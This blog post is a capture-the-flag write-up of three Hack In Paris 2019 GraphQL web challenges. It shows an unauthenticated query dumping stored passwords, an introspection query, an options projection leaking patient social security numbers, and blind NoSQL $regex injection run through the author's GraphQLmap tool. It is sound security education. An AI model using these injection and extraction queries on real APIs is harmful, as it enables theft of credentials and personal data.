---
layout: post
title: HIP19 Writeup - Meet Your Doctor 1,2,3
---

Last wednesday I was in the Hack In Paris event for the 3rd time. As always there were some great conferences and challenges, and a new competition called "Hacker Jeopardy" which was very fun! During the Wargame I focused my time on Web challenges based on the `graphql` technology which was new to me, you will find below my writeups for the `Meet Your Doctor` challenges. 

![HIP Wargame 2019]({{ site.baseurl }}/images/hip19_wargame.png "HIP Wargame 2019"){: .center-image }


## Meet your doctor 1 - 100 pts

URL: `http://meetyourdoctor1.challs.malice.fr`   
Goal : `Please help me find the Meet your doctor Admin password`   

Gobuster revealed a `/graphql` endpoint at the root of the website, browsing [http://meetyourdoctor1.challs.malice.fr/graphql](http://meetyourdoctor1.challs.malice.fr/graphql) gave us an access to an interactive GraphQL interpreter. On this page we can browse the documentation and `schema`. 

There, we can get the structure of the `Doctor` type.

{% highlight sql %}
type Doctor {
  id: ID!
  firstName: String!
  lastName: String!
  specialty: String!
  patients: [Patient!]
  rendezvous: [Rendezvous!]
  email: String!
  password: String!
}
{% endhighlight %}

It seems we don't need to authenticate with the mutation `signIn` to query `Doctor` data.

{% highlight sql %}
type Mutation {
  signIn(login: String!, password: String!): Token!
}
{% endhighlight %}

A simple query `{Doctors{id email password}}` was enough to extract all doctors' email and password. The flag was the password of the Admin doctor : `Now-_Let$|GetSeri0us`

![GraphQL UI]({{ site.baseurl }}/images/doctors1graphql.png "GraphQL UI")


## Meet your doctor 2 - 200 pts

URL: `http://meetyourdoctor2.challs.malice.fr`    
Goal: `I need to find the Patient 0 social security number! It is a matter of life and death`

In this challenge we didn't have access to an online "lab" to test and query the GraphQL. I made a tool to interact with the `/graphql` endpoint, it is open-source and available for free on [Github: https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap).

Using `Introspection` we can still get the GraphQL schema, here is the URL-encoded version (Full version available at "[GraphQL Injection: enumerate-database-schema-via-introspection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection)").

{% highlight sql %}
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
{% endhighlight %}

It is strongly recommended to use `Firefox` to view the server response as it parses JSON an displays it nicely.

![Doctors schema]({{ site.baseurl }}/images/doctors2_schema.png "Doctors schema")

Using GraphQLmap, we got the following structure.

{% highlight sql %}
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)

Query
        doctor[]: email (String!), 
        doctors[Doctor]: options (JSON!), 
        patients[Patient]: 
        patient[]: id (ID!), 
        allrendezvous[Rendezvous]: 
        rendezvous[]: id (ID!), 
Doctor
        id[ID]: 
        firstName[String]: 
        lastName[String]: 
        specialty[String]: 
        patients[None]: 
        rendezvous[None]: 
        email[String]: 
        password[String]: 
Patient
        id[ID]: 
        firstName[String]: 
        lastName[String]: 
        doctor[Doctor]: 
        ssn[String]: 
Rendezvous
        id[ID]: 
        date[String]: 
        confirmed[Boolean]: 
Mutation
        signIn[Token]: login (String!), password (String!), 
Token
        token[String]: 
{% endhighlight %}

In this case `Doctors` have an `options` parameter which accepts JSON. It allows us to specify items linked to the doctors' structure and project their data into the GraphQL response. I saw the following picture in a blog post, it helped me a lot to understand the structure of the query.

![GraphMap]({{ site.baseurl }}/images/graphmap.png "GraphMap")

We can query `{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}`, don't forget to escape the `"` inside the `options`.

{% highlight json %}
GraphQLmap> {doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
{
    "firstName": "Admin",
    "id": "5d089b25f48c29003191e3b5",
    "lastName": "Admin",
    "patients": [
        {
            "ssn": "b16cff8b-4a5a-41c8-8545-d9880fd7aae5"
        }
    ]
} 
{% endhighlight %}

There we go, the second flag was `b16cff8b-4a5a-41c8-8545-d9880fd7aae5`.     
An asciinema version is available at [https://asciinema.org/a/sbqGXnWXl5Y6YeQr0wzsCzQli](https://asciinema.org/a/sbqGXnWXl5Y6YeQr0wzsCzQli)


## Meet your doctor 3 - 300 pts

URL: `http://meetyourdoctor3.challs.malice.fr`    
Goal: `I need to find the Patient 0 social security number! It is a matter of life and death`

Things are getting complicated, we can't dump the schema as the `Introspection` is set to false. Based on the previous challenge we can guess the structure is the same. Unfortunately we can't reuse the same query to extract the `ssn`, we get the following error.

{% highlight bash %}
Field "doctors" argument "search" of type "JSON!" is required, but it was not provided.
{% endhighlight %}

This means there is a `search` argument in the doctor structure, something like `doctors[Doctor]: options (JSON!), search(JSON!)`.    
Pete Correy explains how to exploit the search argument in his blog post [GraphQL NoSQL Injection Through JSON Types](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/).

Let's try a simple NoSQL injection with fields we know such as `lastName`.

{% highlight json %}
OK: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi\"} }"){firstName lastName id}}
KO: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admia\"} }"){firstName lastName id}}
{% endhighlight %}

Since the challenge I added a way to test the regex quickly in GraphQLmap using the `GRAPHQL_CHARSET` keyword inside a GraphQL query:

{% highlight json %}
GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}     
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi$\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi(\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi)\"} }"){firstName lastName id}}   
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi*\"} }"){firstName lastName id}}    
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi0\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi1\"} }"){firstName lastName id}}    
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
{% endhighlight %}

The injection worked, now we can re-use the payload from the challenge #2 and extract the `social security number` of the patient 0, which is the patient of the `Admin` doctor. The query was as follows, where we had to replace `CHARACTER_FROM_THE_FLAG` to test characters from the flag.

{% highlight json %}
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \"^CHARACTER_FROM_THE_FLAG\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
{% endhighlight %}

Obviously we scripted the data extraction in Python, the script below will get the last flag : `4f537c0a-7da6-4acc-81e1-8c33c02ef3b`.

![NOSQL]({{ site.baseurl }}/images/doctors3_nosql.png "NOSQL")

At that time we were checking if the content of `r.json()['data']['doctors']` was not empty, in order to abstract the data extraction we now take a check input from the user in order to compare the output.


{% highlight json %}
GraphQLmap > nosqli
Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
Check > 5d089c51dcab2d0032fdd08d
[+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
{% endhighlight %}

I hope you enjoyed the challenges as I did !     
Feel free to share the blog post ! :)
